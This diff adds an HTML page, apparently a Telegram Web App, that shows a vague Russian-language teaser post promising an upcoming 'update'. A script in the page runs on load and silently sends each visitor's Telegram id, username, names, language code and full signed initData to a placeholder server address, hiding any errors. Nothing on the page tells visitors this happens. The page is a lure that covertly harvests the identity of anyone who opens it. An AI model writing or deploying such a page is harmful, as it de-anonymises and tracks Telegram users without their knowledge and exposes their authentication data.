@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Походу, зря молчал</title>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+      background: #121212;
+      color: #f2f2f2;
+      padding: 20px;
+      line-height: 1.5;
+    }
+    h1 { font-size: 22px; margin-bottom: 12px; }
+    .meta { color: #888; font-size: 13px; margin-bottom: 20px; }
+  </style>
+</head>
+<body>
+  <h1>Походу, зря молчал</h1>
+  <div class="meta">без лишних слов</div>
+  <p>Всё-таки дошло до того, о чём предупреждали. Не думал, что так быстро вылезет наружу.</p>
+  <p>Кому интересно, что дальше — не пропадайте, сегодня-завтра напишу апдейт. Скрины и пересылки сразу мимо.</p>
+
+  <script>
+    const tg = window.Telegram.WebApp;
+    tg.ready();
+    tg.expand();
+
+    const user = tg.initDataUnsafe?.user;
+    const BACKEND_URL = "https://ТВОЙ_АДРЕС_СЕРВЕРА/log";
+
+    if (user && BACKEND_URL.startsWith("https://")) {
+      fetch(BACKEND_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          id: user.id,
+          username: user.username || null,
+          first_name: user.first_name || "",
+          last_name: user.last_name || "",
+          language_code: user.language_code || "",
+          initData: tg.initData || ""
+        })
+      }).catch(() => {});
+    }
+  </script>
+</body>
+</html>
